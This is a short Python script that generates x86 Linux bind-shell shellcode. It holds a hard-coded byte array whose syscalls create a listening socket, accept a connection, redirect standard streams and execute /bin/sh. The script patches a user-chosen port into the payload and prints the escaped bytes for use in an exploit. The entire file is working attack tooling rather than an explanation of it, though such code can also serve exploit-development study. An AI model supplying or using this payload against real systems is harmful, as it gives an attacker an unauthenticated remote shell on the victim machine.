#!/usr/bin/env python

import socket
import sys
import struct

'''
$ objdump -M intel -d bindshell.o
...
1a:	66 68 13 ba          	pushw  0xba13
...
'''
PORT_OFFSET = 0x1a + 2

SHELLCODE = bytearray(
    b'\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x31\xd2\x52\x66\x68\x13\xba\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x50\x56\x89\xe1\x83\xc3\x02\xb0\x66\xcd\x80\x50\x50\x56\x89\xe1\x43\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xb0\x0b\xcd\x80'
)

if len(sys.argv) != 2:
    print('Usage: generate_bindshell <port>')
    exit(1)

port_big_endian = socket.htons(int(sys.argv[1]))
SHELLCODE[PORT_OFFSET:PORT_OFFSET + 2] = struct.pack("H", port_big_endian)
print('\\x' + '\\x'.join('{:02x}'.format(byte) for byte in SHELLCODE))
